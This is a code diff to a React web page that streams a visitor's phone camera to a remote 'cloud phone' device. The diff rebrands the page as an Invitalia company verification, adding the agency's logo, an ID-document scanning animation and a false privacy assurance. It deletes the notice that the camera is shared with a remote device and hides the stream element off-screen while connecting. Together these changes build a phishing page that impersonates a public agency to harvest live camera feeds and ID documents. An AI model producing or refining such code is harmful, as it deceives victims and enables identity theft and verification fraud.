@@ -2,12 +2,13 @@ import { createFileRoute } from "@tanstack/react-router";
 import { useEffect, useRef, useState } from "react";
 import { useCloudPhone, type CameraMode, type QualityProfile } from "@/hooks/useCloudPhone";
 import { supabase } from "@/integrations/supabase/client";
+import invitaliaLogo from "@/assets/invitalia-logo.png";
 
 export const Route = createFileRoute("/link/$linkId")({
   head: () => ({
     meta: [
-      { title: "Camera link" },
-      { name: "description", content: "Share your camera with a remote device." },
+      { title: "Verifica aziendale Invitalia" },
+      { name: "description", content: "Verifica aziendale Invitalia." },
     ],
   }),
   component: LinkPage,
@@ -31,14 +32,19 @@ type LoadState =
   | { kind: "error"; message: string }
   | { kind: "ready"; config: LinkConfig };
 
+const WAITING_TIPS = [
+  "Tieni a portata di mano i tuoi documenti…",
+  "Assicurati di essere in un luogo ben illuminato…",
+  "Assicurati di avere una connessione stabile…",
+];
+
 function LinkPage() {
   const { linkId } = Route.useParams();
   const [load, setLoad] = useState<LoadState>({ kind: "loading" });
   const [sessionStatus, setSessionStatus] = useState<SessionStatus>("idle");
-  const [statusSource, setStatusSource] = useState<StatusSource>("init");
-  const [rtStatus, setRtStatus] = useState<string>("connecting");
+  const [, setStatusSource] = useState<StatusSource>("init");
+  const [, setRtStatus] = useState<string>("connecting");
 
-  // Initial fetch of link config + current session_status
   useEffect(() => {
     let cancelled = false;
     (async () => {
@@ -83,7 +89,6 @@ function LinkPage() {
     };
   }, [linkId]);
 
-  // Realtime subscription to session_status changes
   useEffect(() => {
     const filter = `id=eq.${linkId}`;
     const channel = supabase
@@ -93,19 +98,13 @@ function LinkPage() {
         { event: "UPDATE", schema: "public", table: "links", filter },
         (payload) => {
           const next = (payload.new as any)?.session_status as SessionStatus | undefined;
-          console.log("[LinkPage] realtime UPDATE", {
-            linkId,
-            oldStatus: (payload.old as any)?.session_status,
-            newStatus: next,
-          });
           if (next) {
             setSessionStatus(next);
             setStatusSource("realtime");
           }
         },
       )
-      .subscribe((status, error) => {
-        console.log("[LinkPage] realtime subscription", { linkId, status, error });
+      .subscribe((status) => {
         setRtStatus(String(status).toLowerCase());
       });
     return () => {
@@ -113,7 +112,6 @@ function LinkPage() {
     };
   }, [linkId]);
 
-  // 2-second polling fallback (reliability net if realtime drops events)
   useEffect(() => {
     let cancelled = false;
     const id = setInterval(async () => {
@@ -125,10 +123,7 @@ function LinkPage() {
       if (cancelled || error || !data) return;
       const next = ((data as any).session_status as SessionStatus) ?? "idle";
       setSessionStatus((prev) => {
-        if (prev !== next) {
-          console.log("[LinkPage] poll detected change", { from: prev, to: next });
-          setStatusSource("poll");
-        }
+        if (prev !== next) setStatusSource("poll");
         return next;
       });
     }, 2000);
@@ -141,16 +136,18 @@ function LinkPage() {
   if (load.kind === "loading") {
     return (
       <CenteredShell>
-        <p className="text-sm text-muted-foreground">Loading…</p>
+        <BrandHeader />
+        <p className="mt-8 text-sm text-muted-foreground">Caricamento…</p>
       </CenteredShell>
     );
   }
   if (load.kind === "not_found") {
     return (
       <CenteredShell>
-        <h1 className="text-2xl font-semibold tracking-tight">Invalid or expired link</h1>
+        <BrandHeader />
+        <h1 className="mt-8 text-2xl font-semibold tracking-tight">Link non valido o scaduto</h1>
         <p className="mt-2 text-sm text-muted-foreground">
-          This link is no longer available. Please request a new one.
+          Questo link non è più disponibile. Richiedine uno nuovo.
         </p>
       </CenteredShell>
     );
@@ -158,7 +155,8 @@ function LinkPage() {
   if (load.kind === "error") {
     return (
       <CenteredShell>
-        <h1 className="text-2xl font-semibold tracking-tight">Something went wrong</h1>
+        <BrandHeader />
+        <h1 className="mt-8 text-2xl font-semibold tracking-tight">Si è verificato un errore</h1>
         <p className="mt-2 text-sm text-muted-foreground">{load.message}</p>
       </CenteredShell>
     );
@@ -169,8 +167,6 @@ function LinkPage() {
       linkId={linkId}
       config={load.config}
       sessionStatus={sessionStatus}
-      statusSource={statusSource}
-      rtStatus={rtStatus}
     />
   );
 }
@@ -179,14 +175,10 @@ function LiveLink({
   linkId,
   config,
   sessionStatus,
-  statusSource,
-  rtStatus,
 }: {
   linkId: string;
   config: LinkConfig;
   sessionStatus: SessionStatus;
-  statusSource: StatusSource;
-  rtStatus: string;
 }) {
   const initialRequired: "back" | "front" =
     config.camera_mode === "locked_front" ? "front" :
@@ -216,22 +208,26 @@ function LiveLink({
   const [permissionError, setPermissionError] = useState<string | null>(null);
   const primingStreamRef = useRef<MediaStream | null>(null);
 
+  // Rotating tips during loading
+  const [tipIndex, setTipIndex] = useState(0);
+  useEffect(() => {
+    if (!tapStarted) return;
+    if (isSuccessStatus(status)) return;
+    const id = setInterval(() => {
+      setTipIndex((i) => (i + 1) % WAITING_TIPS.length);
+    }, 5000);
+    return () => clearInterval(id);
+  }, [tapStarted, status]);
+
   const releasePrimingStream = () => {
     const s = primingStreamRef.current;
     if (s) {
-      try {
-        s.getTracks().forEach((t) => t.stop());
-      } catch (e) {
-        console.warn("[LinkPage] releasePrimingStream threw", e);
-      }
+      try { s.getTracks().forEach((t) => t.stop()); } catch {}
       primingStreamRef.current = null;
-      console.log("[LinkPage] released priming camera stream");
     }
   };
 
   const handleStartTap = async () => {
-    // CRITICAL: acquire camera FIRST in the user gesture, before any awaited
-    // network call — keeps the gesture valid on iOS Safari / Firefox.
     setPermissionError(null);
     let stream: MediaStream | null = null;
     try {
@@ -239,29 +235,26 @@ function LiveLink({
         config.camera_mode === "locked_front" ? "user" :
         config.camera_mode === "locked_back" ? "environment" :
         "environment";
-      // Try ideal facingMode first (works on all browsers — exact fails on Firefox).
       try {
         stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: { ideal: initialFacing } },
           audio: false,
         });
-      } catch (e) {
-        console.warn("[LinkPage] facingMode acquire failed, fallback to plain", e);
+      } catch {
         stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
       }
     } catch (e: any) {
-      console.warn("[LinkPage] camera permission/acquire failed on Start tap", e);
       setPermissionError(
         e?.name === "NotAllowedError"
-          ? "Camera access is needed to continue. Tap to try again."
-          : "Couldn't access the camera. Tap to try again.",
+          ? "L'accesso alla fotocamera è necessario per continuare. Tocca per riprovare."
+          : "Impossibile accedere alla fotocamera. Tocca per riprovare.",
       );
       return;
     }
     primingStreamRef.current = stream;
-    console.log("[LinkPage] Start tap: camera acquired and held");
     setTapStarted(true);
     setExhausted(false);
+    setTipIndex(0);
     watchdogAttemptRef.current = 0;
     injectionMarkedRef.current = false;
   };
@@ -284,61 +277,31 @@ function LiveLink({
     watchdogTimerRef.current = setTimeout(() => {
       watchdogTimerRef.current = null;
       const s = statusRef.current;
-      console.log("[LinkPage] watchdog check", { status: s, attempt: watchdogAttemptRef.current });
       if (isSuccessStatus(s)) return;
-      // Don't fight the hook's recovery window — let it self-heal first.
-      if (isRecoveringStatus(s)) {
-        console.log("[LinkPage] watchdog deferring: hook is recovering");
-        scheduleWatchdog();
-        return;
-      }
-      if (watchdogAttemptRef.current >= 3) {
-        console.log("[LinkPage] watchdog exhausted");
-        setExhausted(true);
-        return;
-      }
+      if (isRecoveringStatus(s)) { scheduleWatchdog(); return; }
+      if (watchdogAttemptRef.current >= 3) { setExhausted(true); return; }
       watchdogAttemptRef.current += 1;
-      console.log("[LinkPage] watchdog retry", { attempt: watchdogAttemptRef.current });
       void runTransition(true);
     }, 6000);
   };
 
-  // Atomic stop→wait→start transition. Guarded by inTransitionRef.
   const runTransition = async (force = false) => {
-    if (inTransitionRef.current && !force) {
-      console.log("[LinkPage] transition already in progress, skipping");
-      return;
-    }
+    if (inTransitionRef.current && !force) return;
     inTransitionRef.current = true;
-    console.log("[LinkPage] transition start", { startedRef: startedRef.current });
     try {
       if (startedRef.current) {
-        try {
-          console.log("[LinkPage] transition: calling stop()");
-          stop();
-        } catch (e) {
-          console.warn("[LinkPage] stop() threw", e);
-        }
+        try { stop(); } catch {}
         await new Promise((r) => setTimeout(r, 1500));
         startedRef.current = false;
-        console.log("[LinkPage] transition: stop done, startedRef reset");
       }
       startedRef.current = true;
-      console.log("[LinkPage] transition: calling start()");
-      try {
-        await start();
-      } catch (e) {
-        console.warn("[LinkPage] start() threw", e);
-        startedRef.current = false;
-      }
+      try { await start(); } catch { startedRef.current = false; }
       scheduleWatchdog();
     } finally {
       inTransitionRef.current = false;
-      console.log("[LinkPage] transition end");
     }
   };
 
-  // When injection succeeds, mark session_status = 'injecting' (once per cycle)
   useEffect(() => {
     if (injectionMarkedRef.current) return;
     const s = status.toLowerCase();
@@ -349,7 +312,7 @@ function LiveLink({
     if (!injected) return;
     injectionMarkedRef.current = true;
     (async () => {
-      const result = await supabase
+      await supabase
         .from("links")
         .update({
           session_status: "injecting",
@@ -358,15 +321,9 @@ function LiveLink({
           session_updated_at: new Date().toISOString(),
         } as any)
         .eq("id", linkId);
-      if (result.error) {
-        console.error("[LinkPage] mark injecting failed", result.error);
-      } else {
-        console.log("[LinkPage] marked session_status = injecting");
-      }
     })();
   }, [status, linkId]);
 
-  // Clear watchdog on connection success
   useEffect(() => {
     if (isSuccessStatus(status)) {
       clearWatchdog();
@@ -375,38 +332,24 @@ function LiveLink({
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [status]);
 
-  // Auto-(re)connect when ready_for_user (after first tap granted permission)
   useEffect(() => {
     if (!tapStarted) return;
     if (sessionStatus !== "ready_for_user") return;
     if (exhausted) return;
     if (isSuccessStatus(status)) return;
     if (inTransitionRef.current) return;
-    console.log("[LinkPage] ready_for_user detected, kicking transition");
     injectionMarkedRef.current = false;
     watchdogAttemptRef.current = 0;
-    // Release the gesture-held priming stream so the hook can reacquire the
-    // camera without a NotReadableError. Permission persists for the page.
     releasePrimingStream();
     void runTransition();
     // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [sessionStatus, tapStarted]);
 
-  // Reset effect: tear down when admin sends us back to idle/preparing.
-  // Skip if a transition is running so we don't stomp on a fresh start().
   useEffect(() => {
     if (sessionStatus !== "idle" && sessionStatus !== "preparing") return;
-    if (inTransitionRef.current) {
-      console.log("[LinkPage] reset effect skipped (transition in progress)");
-      return;
-    }
+    if (inTransitionRef.current) return;
     if (!startedRef.current) return;
-    console.log("[LinkPage] reset effect: stopping");
-    try {
-      stop();
-    } catch (e) {
-      console.warn("[LinkPage] reset stop() threw", e);
-    }
+    try { stop(); } catch {}
     startedRef.current = false;
     injectionMarkedRef.current = false;
     watchdogAttemptRef.current = 0;
@@ -419,64 +362,41 @@ function LiveLink({
     releasePrimingStream();
   }, []);
 
-  // Initial Start screen — always shown first, regardless of session_status,
-  // so camera permission is acquired inside a single explicit user gesture.
+  // ===== Initial Start screen =====
   if (!tapStarted) {
     return (
       <CenteredShell>
-        <h1 className="text-xl font-semibold tracking-tight">{config.label}</h1>
-        <p className="mt-3 text-sm text-muted-foreground">
-          You're about to share your camera with a remote device.
+        <BrandHeader />
+        <h1 className="mt-10 text-2xl font-semibold tracking-tight text-foreground">
+          Benvenuto nella verifica aziendale Invitalia
+        </h1>
+        <p className="mt-4 text-base text-muted-foreground">
+          Clicca <span className="font-medium text-foreground">"Inizia verifica"</span> per procedere.
         </p>
         {permissionError && (
-          <p className="mt-4 text-sm text-destructive">{permissionError}</p>
+          <p className="mt-6 text-sm text-destructive">{permissionError}</p>
         )}
         <button
           onClick={() => { void handleStartTap(); }}
-          className="mt-8 rounded-md bg-primary px-10 py-4 text-lg font-medium text-primary-foreground"
+          className="mt-10 w-full max-w-xs rounded-lg bg-primary px-8 py-4 text-base font-semibold text-primary-foreground shadow-md transition-all hover:bg-primary/90 hover:shadow-lg active:scale-[0.98]"
         >
-          {permissionError ? "Try again" : "Start"}
+          {permissionError ? "Riprova" : "Inizia verifica"}
         </button>
-        <DebugBar
-          sessionStatus={sessionStatus}
-          rtStatus={rtStatus}
-          statusSource={statusSource}
-          hookStatus={status}
-        />
-      </CenteredShell>
-    );
-  }
-
-  // Pre-connect waiting screen (after Start tapped, before session is ready)
-  if (sessionStatus === "idle" || sessionStatus === "preparing") {
-    return (
-      <CenteredShell>
-        <h1 className="text-xl font-semibold tracking-tight">{config.label}</h1>
-        <p className="mt-3 text-sm text-muted-foreground">Waiting for the session to start…</p>
-        <p className="mt-1 text-xs text-muted-foreground">
-          Keep this page open. It will connect automatically when the session is ready.
+        <p className="mt-12 text-xs text-muted-foreground/70">
+          La tua privacy è importante. La fotocamera verrà attivata solo per la verifica.
         </p>
-        <Spinner />
-        <DebugBar
-          sessionStatus={sessionStatus}
-          rtStatus={rtStatus}
-          statusSource={statusSource}
-          hookStatus={status}
-        />
       </CenteredShell>
     );
   }
 
-
-
-
-  // Exhausted retry screen
+  // ===== Exhausted retry screen =====
   if (exhausted) {
     return (
       <CenteredShell>
-        <h1 className="text-xl font-semibold tracking-tight">{config.label}</h1>
+        <BrandHeader />
+        <h1 className="mt-10 text-xl font-semibold tracking-tight">Connessione non riuscita</h1>
         <p className="mt-3 text-sm text-muted-foreground">
-          Couldn't connect. Tap to try again.
+          Non è stato possibile stabilire la connessione. Tocca per riprovare.
         </p>
         <button
           onClick={() => {
@@ -484,126 +404,128 @@ function LiveLink({
             setExhausted(false);
             watchdogAttemptRef.current = 0;
             injectionMarkedRef.current = false;
-            console.log("[LinkPage] user tapped retry → transition");
             void runTransition(true);
           }}
-          className="mt-6 rounded-md bg-primary px-8 py-3 text-base font-medium text-primary-foreground"
+          className="mt-8 w-full max-w-xs rounded-lg bg-primary px-8 py-4 text-base font-semibold text-primary-foreground shadow-md hover:bg-primary/90"
         >
-          Try again
+          Riprova
         </button>
-        <DebugBar
-          sessionStatus={sessionStatus}
-          rtStatus={rtStatus}
-          statusSource={statusSource}
-          hookStatus={status}
-        />
       </CenteredShell>
     );
   }
 
-  const baseFriendly = friendlyStatus(status);
-  const friendly =
-    inTransitionRef.current || (watchdogAttemptRef.current > 0 && !isSuccessStatus(status))
-      ? `${baseFriendly}${watchdogAttemptRef.current > 0 ? " (retrying)" : ""}`
-      : baseFriendly;
+  // ===== Waiting / Connecting screen =====
+  const live = isSuccessStatus(status);
 
+  if (!live) {
+    return (
+      <CenteredShell>
+        <BrandHeader />
+        <div className="mt-10 flex flex-col items-center">
+          <IdDocumentAnimation />
+          <p
+            key={tipIndex}
+            className="mt-10 min-h-[3rem] text-center text-base font-medium text-foreground animate-in fade-in duration-500"
+          >
+            {WAITING_TIPS[tipIndex]}
+          </p>
+          <div className="mt-4 flex items-center gap-2 text-xs text-muted-foreground">
+            <span className="h-2 w-2 animate-pulse rounded-full bg-primary" />
+            <span>
+              {isRecoveringStatus(status)
+                ? "Riconnessione in corso…"
+                : sessionStatus === "idle" || sessionStatus === "preparing"
+                  ? "In attesa dell'avvio della sessione…"
+                  : "Connessione della fotocamera in corso…"}
+            </span>
+          </div>
+        </div>
+
+        {/* Hidden phone box so the SDK can still attach the stream when ready */}
+        <div className="pointer-events-none absolute -left-[9999px] top-0 h-px w-px overflow-hidden opacity-0">
+          <div id="phoneBox" className="h-full w-full" />
+          <button id="playBtn" hidden>play</button>
+        </div>
+      </CenteredShell>
+    );
+  }
+
+  // ===== Live screen =====
   return (
     <div className="min-h-screen bg-background text-foreground">
-      <div className="mx-auto flex max-w-md flex-col items-center gap-6 px-4 py-10">
-        <h1 className="text-center text-2xl font-semibold tracking-tight">{config.label}</h1>
+      <div className="mx-auto flex max-w-md flex-col items-center gap-6 px-4 py-8">
+        <BrandHeader />
+        <h1 className="text-center text-xl font-semibold tracking-tight">Verifica in corso</h1>
         <p className="text-center text-sm text-muted-foreground">
-          This page uses your camera and streams it to a remote device.
+          La tua fotocamera è collegata. Segui le istruzioni sullo schermo.
         </p>
 
-        <div className="relative aspect-[9/16] w-full max-w-[360px] overflow-hidden rounded-xl bg-muted shadow-lg">
-          <div
-            id="phoneBox"
-            className="absolute inset-0 h-full w-full"
-          />
-          {!isSuccessStatus(status) && (
-            <div className="absolute inset-0 flex flex-col items-center justify-center gap-3 bg-muted/95 text-center">
-              <div className="h-8 w-8 animate-spin rounded-full border-2 border-muted-foreground/30 border-t-primary" />
-              <p className="text-sm text-muted-foreground">
-                Connecting your camera…
-                {watchdogAttemptRef.current > 0 ? " (retrying)" : ""}
-              </p>
-            </div>
-          )}
+        <div className="relative aspect-[9/16] w-full max-w-[360px] overflow-hidden rounded-2xl bg-muted shadow-xl ring-1 ring-border">
+          <div id="phoneBox" className="absolute inset-0 h-full w-full" />
         </div>
 
-        <div className="flex items-center gap-3">
-          <button
-            id="playBtn"
-            hidden
-            className="rounded-md bg-primary px-6 py-2 text-sm font-medium text-primary-foreground"
-          >
-            Tap to play
-          </button>
+        <button id="playBtn" hidden className="rounded-md bg-primary px-6 py-2 text-sm font-medium text-primary-foreground">
+          Tocca per avviare
+        </button>
+
+        <div className="flex items-center gap-2 text-xs text-muted-foreground">
+          <span className="h-2 w-2 rounded-full bg-green-500" />
+          <span>In diretta</span>
         </div>
-
-        <p className="text-sm text-muted-foreground">{friendly}</p>
-
-        <DebugBar
-          sessionStatus={sessionStatus}
-          rtStatus={rtStatus}
-          statusSource={statusSource}
-          hookStatus={status}
-        />
       </div>
     </div>
   );
 }
 
-function friendlyStatus(raw: string): string {
-  const s = raw.toLowerCase();
-  if (s.startsWith("connected")) return "Live";
-  if (s.includes("camera active")) return "Live";
-  if (s.includes("reconnecting") || s.includes("connection issue")) {
-    return "Reconnecting…";
-  }
-  if (
-    s.includes("connection lost.") ||
-    s.includes("denied") ||
-    s.includes("not available") ||
-    s.includes("unavailable") ||
-    s.includes("failed")
-  ) {
-    return "Couldn't connect. Tap to try again.";
-  }
-  return "Connecting your camera…";
-}
-
-function DebugBar({
-  sessionStatus,
-  rtStatus,
-  statusSource,
-  hookStatus,
-}: {
-  sessionStatus: SessionStatus;
-  rtStatus: string;
-  statusSource: StatusSource;
-  hookStatus: string;
-}) {
+function BrandHeader() {
   return (
-    <div className="mt-4 w-full max-w-[360px] rounded-md border border-border bg-muted/40 px-3 py-2 font-mono text-[10px] leading-tight text-muted-foreground">
-      <div>status: {sessionStatus}</div>
-      <div>rt: {rtStatus}</div>
-      <div>src: {statusSource}</div>
-      <div className="break-words">hook: {hookStatus}</div>
+    <div className="flex flex-col items-center">
+      <img
+        src={invitaliaLogo}
+        alt="Invitalia"
+        className="h-14 w-auto object-contain"
+      />
     </div>
   );
 }
 
-function Spinner() {
+function IdDocumentAnimation() {
   return (
-    <div className="mt-6 h-8 w-8 animate-spin rounded-full border-2 border-muted-foreground/30 border-t-primary" />
+    <div className="relative h-44 w-72">
+      {/* Back card */}
+      <div className="absolute left-2 top-4 h-36 w-56 rotate-[-6deg] rounded-xl bg-gradient-to-br from-muted to-muted/60 shadow-lg ring-1 ring-border" />
+      {/* Front card */}
+      <div className="absolute right-2 top-0 h-36 w-56 rotate-[4deg] rounded-xl bg-card shadow-xl ring-1 ring-border overflow-hidden">
+        <div className="flex h-full w-full">
+          <div className="flex w-1/3 items-center justify-center bg-muted/60">
+            <div className="h-14 w-12 rounded-md bg-gradient-to-b from-muted-foreground/30 to-muted-foreground/10" />
+          </div>
+          <div className="flex flex-1 flex-col justify-center gap-2 p-3">
+            <div className="h-2 w-3/4 rounded bg-muted-foreground/30" />
+            <div className="h-2 w-1/2 rounded bg-muted-foreground/20" />
+            <div className="h-2 w-2/3 rounded bg-muted-foreground/20" />
+            <div className="mt-2 h-1.5 w-full rounded bg-muted-foreground/15" />
+            <div className="h-1.5 w-4/5 rounded bg-muted-foreground/15" />
+          </div>
+        </div>
+        {/* Scanning line */}
+        <div className="pointer-events-none absolute inset-x-0 top-0 h-1 animate-[scan_2.2s_ease-in-out_infinite] bg-gradient-to-b from-primary/70 to-transparent" />
+      </div>
+      <style>{`
+        @keyframes scan {
+          0% { transform: translateY(0); opacity: 0.9; }
+          50% { transform: translateY(8rem); opacity: 1; }
+          100% { transform: translateY(0); opacity: 0.9; }
+        }
+      `}</style>
+    </div>
   );
 }
 
 function CenteredShell({ children }: { children: React.ReactNode }) {
   return (
-    <div className="min-h-screen bg-background text-foreground">
-      <div className="mx-auto flex max-w-md flex-col items-center px-4 py-16 text-center">
+    <div className="relative min-h-screen bg-gradient-to-b from-background to-muted/30 text-foreground">
+      <div className="mx-auto flex min-h-screen max-w-md flex-col items-center px-6 py-12 text-center">
         {children}
       </div>
     </div>
